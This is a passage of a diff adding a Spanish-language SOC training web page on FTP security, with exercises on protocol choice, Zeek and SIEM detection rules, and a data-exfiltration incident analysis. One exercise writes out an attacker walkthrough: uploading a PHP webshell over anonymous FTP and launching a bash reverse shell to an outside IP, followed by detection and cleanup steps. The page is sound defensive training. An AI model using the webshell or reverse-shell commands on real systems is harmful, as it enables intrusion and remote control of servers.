+              <li data-i18n="ftp.ej3.s2">Portal de carga de archivos para clientes externos (proveedor entrega reportes via FTP)</li>
+              <li data-i18n="ftp.ej3.s3">Servidor FTP legacy de Windows que no puede ser reemplazado a corto plazo pero sí necesita mejorar la seguridad</li>
+              <li data-i18n="ftp.ej3.s4">Script de automatización que sube archivos de configuración a 50 dispositivos de red</li>
+            </ol>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+1. Backups nocturnos entre servidores Linux internos → SFTP o SCP
+
+   Razón:
+   → Ambos son Linux → SSH ya está instalado → SFTP/SCP sin costo adicional
+   → Cifrado completo (credenciales + datos) incluso en red interna
+   → Puede usar autenticación por llave SSH (sin contraseña) para automatización
+   → SCP es más simple para scripts, SFTP tiene más funcionalidades (ls, rm, etc.)
+
+   Implementación:
+   rsync -avz -e "ssh -i /home/backup/.ssh/id_rsa" /backups/ user@server:/backups/
+   # O directamente:
+   scp -i /home/backup/.ssh/id_rsa backup.tar.gz user@server:/backups/
+
+2. Portal para clientes externos → FTPS o SFTP con acceso restringido
+
+   Razón:
+   → Clientes externos = tráfico sobre Internet = cifrado OBLIGATORIO
+   → FTPS si los clientes usan FileZilla u otros clientes FTP estándar
+     (más familiar para usuarios no técnicos, compatible con GUI FTP)
+   → SFTP si los clientes tienen capacidad SSH
+   → NUNCA FTP plain sobre Internet — las credenciales viajarán en claro por todos
+     los nodos de tránsito entre el cliente y tu servidor
+
+   Consideración adicional:
+   → IP allowlisting del cliente + notificación automática de login
+
+3. Servidor FTP Windows legacy → FTPS (FTP sobre TLS)
+
+   Razón:
+   → No puede ser reemplazado, pero Windows IIS soporta FTPS nativamente
+   → FTPS añade TLS encima del FTP existente sin cambiar el protocolo base
+   → Los clientes FTP existentes (FileZilla, WinSCP) soportan FTPS
+   → Menor impacto operativo que migrar a SFTP completamente nuevo
+   → Implementar: en IIS Manager → FTP SSL Settings → "Require SSL connections"
+
+4. Scripts de configuración a 50 dispositivos de red → SFTP o SCP
+
+   Razón:
+   → Los dispositivos de red modernos (Cisco, Juniper, etc.) soportan SCP/SFTP
+   → Automatizable con scripts Python (paramiko) o Ansible
+   → Si los dispositivos solo soportan FTP legacy → usar TFTP en red interna
+     segmentada (TFTP no tiene auth pero es efímero y controlable por ACL)
+
+   Ansible ejemplo:
+   - name: Upload config
+     net_put:
+       src: /configs/router.cfg
+       dest: /flash/running-config
+       protocol: sftp
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-04</span>
+            <span class="ejercicio-title" data-i18n="ftp.ej4.title">Detectar FTP en la red corporativa</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ftp.ej4.q">Como analista SOC, te piden detectar todo uso de FTP en la red y crear un baseline. ¿Cómo lo hacés? Describí las consultas y reglas que crearías en Zeek y el SIEM.</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+PASO 1 — DESCUBRIMIENTO: ¿quién usa FTP en la red?
+
+Zeek — obtener todos los hosts con actividad FTP en los últimos 30 días:
+  zeek-cut id.orig_h id.resp_h user reply_code < ftp.log \
+    | sort | uniq -c | sort -rn
+
+NetFlow / conn.log — detectar TCP/21 que Zeek no procesó:
+  zeek-cut id.orig_h id.resp_h id.resp_p < conn.log \
+    | awk '$3 == "21"' | sort | uniq -c | sort -rn
+
+Nmap — escanear la red buscando FTP abierto:
+  nmap -p 21 --open 10.0.0.0/24 -oG ftp_hosts.txt
+
+PASO 2 — BASELINE: clasificar el uso encontrado
+
+Para cada host FTP identificado:
+  → ¿Está documentado? ¿Tiene caso de negocio?
+  → ¿Acceso interno o externo?
+  → ¿Qué usuarios se conectan?
+  → ¿Tiene anonymous habilitado?
+
+PASO 3 — REGLAS Y ALERTAS en el SIEM
+
+Regla 1: FTP anónimo (siempre alertar)
+  title: Anonymous FTP Login
+  detection:
+    user: "anonymous"
+    reply_code: 230
+  level: high
+
+Regla 2: FTP desde Internet (siempre alertar)
+  title: FTP Access from External IP
+  detection:
+    id.resp_p: 21
+    id.orig_h: NOT $HOME_NET
+    reply_code: 230
+  level: critical
+
+Regla 3: Brute force FTP
+  title: FTP Brute Force
+  detection:
+    reply_code: 530
+    condition: count() by id.orig_h > 20 | timeframe 60s
+  level: medium
+
+Regla 4: FTP usado para exfiltración (archivos grandes descargados)
+  title: Large FTP Download - Possible Exfiltration
+  detection:
+    command: RETR
+    file_size: > 10MB
+    id.orig_h: NOT $AUTHORIZED_FTP_CLIENTS
+  level: medium
+
+Regla 5: Upload anónimo FTP
+  title: Anonymous FTP Upload
+  detection:
+    user: "anonymous"
+    command: STOR
+  level: critical
+
+PASO 4 — REMEDIACIÓN
+
+Para cada servicio FTP identificado:
+  1. Deshabilitar si no tiene caso de negocio activo
+  2. Migrar a SFTP/FTPS si sigue siendo necesario
+  3. Documentar excepción con owner, fecha de revisión, controles compensatorios
+  4. Agregar a whitelist si es legítimo y monitoreado
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-05</span>
+            <span class="ejercicio-title" data-i18n="ftp.ej5.title">¿Cómo un atacante convierte un FTP con escritura en persistencia?</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ftp.ej5.q">El atacante encontró un FTP con anonymous write en un servidor web. Describí los pasos completos para establecer persistencia y cómo detectarlo y eliminarlo.</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+PASOS DEL ATACANTE:
+
+1. Descubrimiento del FTP con escritura anónima:
+   nmap -p 21 --script ftp-anon target.com
+   → "ftp-anon: Anonymous FTP login allowed (FILES: 3)"
+   → Verificar si tiene permisos de escritura: conectar y hacer PUT
+
+2. Subir webshell vía FTP anónimo:
+   ftp target.com
+   Name: anonymous
+   Password: hacker@test.com
+   ftp> cd pub     ← o /var/www/html/, /uploads/, /files/, etc.
+   ftp> put shell.php
+   ftp> quit
+
+   Contenido de shell.php (versión mínima):
+   <?php system($_GET['cmd']); ?>
+
+   URL de acceso: http://target.com/pub/shell.php?cmd=whoami
+
+3. Verificar que funciona:
+   curl "http://target.com/pub/shell.php?cmd=id"
+   → uid=33(www-data) gid=33(www-data)
+
+4. Escalar a shell inversa:
+   curl "http://target.com/pub/shell.php?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+   (atacante escucha en nc -lvnp 4444)
+
+5. Persistencia adicional (si tiene permisos):
+   → Agregar cron job, SSH key, usuario del sistema
+   → Subir más webshells con nombres inocuos (image.php, config.php)
+
+DETECCIÓN:
+
+FTP:
+  Zeek ftp.log: user=anonymous + command=STOR → ALERTA CRÍTICA inmediata
+
+Web access logs (Apache/Nginx):
+  grep "shell.php" /var/log/apache2/access.log
+  grep "?cmd=" /var/log/nginx/access.log
+  → Peticiones con parámetros del sistema (whoami, id, ls, etc.)
+
+Filesystem:
+  find /var/www /var/ftp -name "*.php" -newer /var/www/index.php
+  → Archivos PHP creados recientemente (post-upload)
+
+  find /var/ftp -perm /o+w -type d
+  → Directorios con escritura para "others" (anonymous)
+
+ELIMINACIÓN Y REMEDIACIÓN:
+
+Inmediato:
+  1. find /var/www /var/ftp -name "shell.php" -delete
+     (buscar también por contenido: grep -r "system(\$_GET" /var/www)
+  2. Verificar que no hay más shells: grep -r "base64_decode\|eval\|system\|exec" /var/www/*.php
+  3. Revisar cron, /etc/passwd, ~/.ssh/authorized_keys (¿agregó persistence?)
+  4. Deshabilitar FTP o al menos quitar escritura anónima:
+     En vsftpd.conf: anon_upload_enable=NO  anon_mkdir_write_enable=NO
+
+Largo plazo:
+  5. Separar el directorio raíz de FTP del document root de Apache/Nginx
+     (el FTP no debería apuntar a /var/www/html/)
+  6. Implementar SFTP con autenticación real
+  7. WAF rule para bloquear peticiones con parámetros de shell
+
+LECCIÓN: FTP anónimo con escritura en un servidor web = ejecución
+remota de código sin autenticación. Siempre separar FTP de webroot.
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini Challenge -->
+        <div class="mini-challenge">
+          <div class="challenge-label" data-i18n="ej.challenge">🚨 Mini-Challenge · Resolver el incidente</div>
+          <h3 data-i18n="ftp.challenge.title">Incidente #FTP-001: "El servidor que trabaja de noche"</h3>
+          <p style="color:var(--text-secondary);font-size:0.9rem;margin-bottom:1rem;" data-i18n="ftp.challenge.ctx">
+            Martes 06:00. Correlación SIEM: el servidor de archivos (10.0.0.20) generó 8.5 GB de tráfico saliente entre las 02:00 y las 03:45, hacia la IP 185.220.101.5 (Tor exit node). Los usuarios no trabajan de noche. El servidor tiene FTP (puerto 21) habilitado desde hace años.
+          </p>
+          <pre style="font-size:0.78rem;margin-bottom:1rem;" data-i18n="ftp.pre9">
+Zeek ftp.log (02:00 - 03:45):
+  02:00:11  185.220.101.5  → 10.0.0.20  user=ftpuser  pass=ftpuser123  reply=230
+  02:00:15  185.220.101.5  → 10.0.0.20  RETR  Q1_financials_2024.xlsx    (2.1MB)
+  02:00:18  185.220.101.5  → 10.0.0.20  RETR  contracts_signed_2024.zip  (45MB)
+  02:00:55  185.220.101.5  → 10.0.0.20  RETR  employees_salaries.xlsx    (890KB)
+  [... 847 archivos RETR en 105 minutos ...]
+  03:44:50  185.220.101.5  → 10.0.0.20  QUIT
+
+Zeek conn.log previo (01:50 - 02:00):
+  185.220.101.5 → 10.0.0.20:21  [SYN→SYN-ACK→ACK] — múltiples intentos 530
+  Intentos login fallidos: 45 antes de 230 exitoso</pre>
+          <div class="ejercicio-card" style="border-color:var(--proto-color);margin-top:0;">
+            <div class="ejercicio-header">
+              <span class="ejercicio-number">CHALLENGE</span>
+              <span class="ejercicio-title" data-i18n="ftp.challenge.q">¿Qué pasó? Respuesta completa, notificaciones y lecciones</span>
+              <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+            </div>
+            <div class="ejercicio-body">
+              <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver análisis completo</button>
+              <div class="respuesta-box">
+QUÉ PASÓ: Brute Force FTP + Exfiltración masiva de datos confidenciales
+
+TIMELINE:
+  01:50 — Tor exit node 185.220.101.5 inicia brute force contra FTP
+           45 intentos fallidos (reply=530) en 10 minutos
+           Contraseña probada: probablemente wordlist con ftpuser/ftpuser123
+           → La contraseña era DÉBIL y PREDECIBLE (usuario=contraseña con número)
+
+  02:00 — Login exitoso con ftpuser/ftpuser123
+           El atacante tiene acceso a todos los archivos del servidor FTP
+
+  02:00 - 03:44 — Descarga sistemática de 847 archivos en 105 minutos
+           = ~8.1 archivos/minuto → scripted/automatizado (no manual)
+           Archivos descargados incluyen DATOS CONFIDENCIALES:
+           - Información financiera (Q1 financials)
+           - Contratos firmados
+           - Salarios de empleados (PII + datos sensibles)
+           Total: 8.5 GB de datos corporativos exfiltrados
+
+  03:45 — El atacante cierra la sesión ordenadamente (QUIT)
+
+GRAVEDAD: CRÍTICA — incidente de datos mayor
+
+ALCANCE:
+  → 8.5 GB de datos en manos de atacante anónimo (Tor exit node)
+  → Contratos → secretos comerciales
+  → Salarios → datos personales de empleados (GDPR/ley de protección de datos)
+  → Financials → información privilegiada si es empresa pública
+
+RESPUESTA INMEDIATA (T+0 — 06:00):
+  1. Deshabilitar FTP en 10.0.0.20 (firewall + servicio)
+     iptables -A INPUT -p tcp --dport 21 -j DROP
+  2. Cambiar TODAS las contraseñas del servidor
+  3. Activar incident response formal → este es un data breach
+
+RESPUESTA A CORTO PLAZO (T+24h):
+  4. Determinar la lista exacta de archivos robados (847 archivos)
+     zeek-cut command arg < ftp.log | awk '$1=="RETR"' | cut -f2 > stolen_files.txt
+  5. Clasificar los datos por sensibilidad
+  6. Verificar si el atacante subió algo (STOR) — ¿backdoor?
+     zeek-cut command arg < ftp.log | awk '$1=="STOR"'
+
+NOTIFICACIONES LEGALES (dependen de la jurisdicción):
+  → GDPR (si hay datos de ciudadanos EU): 72h para notificar a la autoridad
+  → Empleados afectados por employee_salaries.xlsx
+  → Clientes/partners si hay datos en los contratos
+  → Board / CEO: 8.5 GB de información confidencial = crisis corporativa
+
+LECCIONES:
+  1. FTP con credenciales débiles (user=pass+número) → NO aceptable
+  2. FTP accesible desde Internet: NUNCA — bloquear TCP/21 saliente/entrante en borde
+  3. Sin rate limiting ni bloqueo tras N intentos fallidos
+     → 45 intentos sin alarma → el SIEM debería haber alertado a las 01:55
+  4. Datos confidenciales en servidor FTP en claro → NO aceptable
+  5. Monitoreo nocturno insuficiente → 105 minutos de exfiltración sin detección
+
+REMEDIACIÓN PERMANENTE:
+  → Migrar a SFTP con llave SSH (eliminar contraseñas FTP)
+  → NEVER exponer FTP a Internet (ni con credenciales fuertes)
+  → Alertar: intentos FTP fallidos > 5 desde externa → bloquear IP automáticamente
+  → Datos confidenciales solo en sistemas con cifrado en reposo + control de acceso
+  → DLP (Data Loss Prevention): alertar cuando se descarga >100MB desde servidor FTP
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /tab ejercicios -->
+
+    <!-- ── Tab: Recursos ── -->
+    <div class="tab-content" data-tab="recursos">
+
+      <div class="section-title" data-i18n="rec.official">📄 Documentación Oficial</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 959 — FTP (1985)</h4>
+          <p data-i18n="ftp.rec.rfc">Especificación original de FTP. Útil para entender los comandos y códigos de respuesta.</p>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc959" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc959</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 2577 — FTP Security Considerations</h4>
+          <p data-i18n="ftp.rec.guide">Guía de seguridad para FTP: bounce attacks, anonymous access, protecciones recomendadas.</p>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc2577" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc2577</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.tools">🛠️ Herramientas SOC</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="ftp.rec.badge.zeek">Análisis · Zeek</div>
+          <h4 data-i18n="ftp.rec.h4.zeek">Zeek ftp.log — consultas útiles</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;" data-i18n="ftp.pre10"># Extraer todas las credenciales capturadas
+zeek-cut ts id.orig_h user password < ftp.log | grep -v "^-"
+
+# Logins anónimos
+zeek-cut ts id.orig_h user < ftp.log | awk '$3=="anonymous"'
+
+# Archivos descargados
+zeek-cut id.orig_h command arg < ftp.log | awk '$2=="RETR"'
+
+# Archivos subidos (posibles backdoors)
+zeek-cut id.orig_h command arg < ftp.log | awk '$2=="STOR"'</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="ftp.rec.badge.nmap">Detección · nmap</div>
+          <h4 data-i18n="ftp.rec.h4.nmap">nmap — auditoría FTP</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;" data-i18n="ftp.pre11"># Detectar FTP anónimo
+nmap -p 21 --script ftp-anon 192.168.1.0/24
+
+# Banner grabbing (versión del servidor)
+nmap -p 21 --script ftp-syst 192.168.1.20
+
+# Brute force (solo en pentest autorizado)
+nmap -p 21 --script ftp-brute 192.168.1.20</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="ftp.rec.badge.sftp">Migración · SFTP</div>
+          <h4>Configurar SFTP en Linux</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;" data-i18n="ftp.pre12"># En /etc/ssh/sshd_config:
+Subsystem sftp /usr/lib/openssh/sftp-server
+
+# Grupo SFTP-only (sin shell):
+Match Group sftponly
+  ChrootDirectory /data/sftp/%u
+  ForceCommand internal-sftp
+  AllowTcpForwarding no
+
+# Agregar usuario al grupo:
+usermod -aG sftponly ftpuser</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Hardening</div>
+          <h4>vsftpd — deshabilitar anonymous</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># /etc/vsftpd.conf
+anonymous_enable=NO
+anon_upload_enable=NO
+anon_mkdir_write_enable=NO
+local_enable=YES
+write_enable=YES
+
+# Limitar intentos de login:
+max_login_fails=3
+
+# TLS (FTPS):
+ssl_enable=YES
+rsa_cert_file=/etc/ssl/certs/vsftpd.pem
+force_local_logins_ssl=YES</pre>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cheatsheet">📋 Cheatsheet FTP para SOC</div>
+      <div class="cheatsheet-table-wrap">
+        <table class="cheatsheet-table">
+          <thead>
+            <tr><th data-i18n="cheat.signal">Señal en logs</th><th data-i18n="cheat.attack">Posible ataque/riesgo</th><th data-i18n="cheat.action">Acción</th></tr>
+          </thead>
+          <tbody>
+            <tr><td data-i18n="ftp.ch.r1a">user=anonymous en ftp.log</td><td data-i18n="ftp.ch.r1b">Acceso anónimo (siempre IOC en red interna)</td><td data-i18n="ftp.ch.r1c">Alertar, verificar permisos anónimos</td></tr>
+            <tr><td data-i18n="ftp.ch.r2a">command=STOR de usuario anónimo</td><td data-i18n="ftp.ch.r2b">Upload anónimo — posible backdoor/malware</td><td data-i18n="ftp.ch.r2c">Crítico — aislar servidor, buscar el archivo</td></tr>
+            <tr><td data-i18n="ftp.ch.r3a">reply_code=530 × N desde misma IP en corto tiempo</td><td>Brute force FTP</td><td data-i18n="ftp.ch.r3c">Bloquear IP, revisar si tuvo éxito (reply=230)</td></tr>
+            <tr><td data-i18n="ftp.ch.r4a">FTP desde IP externa (no RFC1918)</td><td data-i18n="ftp.ch.r4b">Acceso desde Internet — credenciales en claro en tránsito</td><td data-i18n="ftp.ch.r4c">Crítico — bloquear, migrar a SFTP</td></tr>
+            <tr><td data-i18n="ftp.ch.r5a">RETR de archivos sensibles (*.sql, *salary*, *contract*)</td><td data-i18n="ftp.ch.r5b">Exfiltración de datos</td><td data-i18n="ftp.ch.r5c">Verificar si es uso legítimo, alertar si es externo</td></tr>
+            <tr><td data-i18n="ftp.ch.r6a">Tráfico saliente FTP nocturno/inusual alto</td><td data-i18n="ftp.ch.r6b">Exfiltración automatizada</td><td data-i18n="ftp.ch.r6c">Activar IR, revisar ftp.log completo</td></tr>
+            <tr><td data-i18n="ftp.ch.r7a">Banner FTP con versión de servidor en texto claro</td><td data-i18n="ftp.ch.r7b">Information disclosure — versión puede tener CVEs</td><td data-i18n="ftp.ch.r7c">Suprimir banner, actualizar software FTP</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-3" data-i18n="rec.labs">🎯 Labs y Referencias</div>
+      <div class="recursos-grid">
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1048.003 — Exfiltration Over Unencrypted Protocol</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1048/003/" target="_blank" rel="noopener">→ attack.mitre.org/T1048/003</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1110.001 — Brute Force: Password Guessing</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1110/001/" target="_blank" rel="noopener">→ attack.mitre.org/T1110/001</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Zeek</div>
+          <h4>Zeek FTP log reference</h4>
+          <a class="recurso-link" href="https://docs.zeek.org/en/master/logs/ftp.html" target="_blank" rel="noopener">→ docs.zeek.org/en/master/logs/ftp.html</a>
+        </div>
+      </div>
+
+    </div><!-- /tab recursos -->
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-links">
+        <a href="../smb/index.html">← SMB</a>
+        <a href="../index.html">Hub</a>
+        <a href="../ssh/index.html">SSH →</a>
+      </div>
+      <p data-i18n="footer.license">@xavimape · Uso educativo y defensivo · MIT License</p>
+    </div>
+  </footer>
+
+  <script src="../theme-switcher.js"></script>
+  <script src="../i18n-core.js"></script>
+  <script src="../i18n-ftp.js"></script>
+  <script src="../shared.js"></script>
+  <script src="app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      SOC.initSlides('ftp-slides');
+      SOC.initEjercicios();
+      SOC.saveProgress('ftp', 'demo');
+    });
+  </script>
+</body>
+</html>
